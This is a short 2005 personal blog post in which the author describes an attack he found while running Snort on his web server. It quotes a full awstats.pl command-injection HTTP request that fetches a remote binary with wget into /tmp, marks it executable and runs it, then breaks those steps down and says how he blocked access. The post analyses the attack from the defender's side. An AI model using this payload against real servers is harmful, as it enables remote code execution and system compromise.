---
author: David Hogue
comments: false
date: 2005-12-03 02:48:21+00:00
layout: post
slug: securing-my-site
title: Securing My Site
wordpress_id: 306
categories:
- Technology
tags:
- old-blog
---

While trying to learn about network security I installed snort on this box.  Today while configuring the server to allow me to access WordPress's admin area over SSL I found a couple interesting things I thought I would share.


    
    
    GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024
        %2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20
        216%2e102%2e212%2e115;echo%20YYY;echo|  HTTP/1.1
    Host: x.x.x.x
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1;)
    



The interesting part is

    
    
    wget y.y.y.y/listen;
    chmod +x listen;
    ./listen z.z.z.z;
    



Basically downloading some sort of app, then running that app.  I assume this app will connect to z.z.z.z which is either an already cracked system or one that they are targetting.  I also assume from the name listen that it will open a port on my server (which won't work due to the firewall).

Now this could just be some worm since I have seen several of these hits recently.  The IP it came from is not any of the IPs listed in the url.

Also I did have awstats running.  I have since blocked off general access to it and a few other scripts.
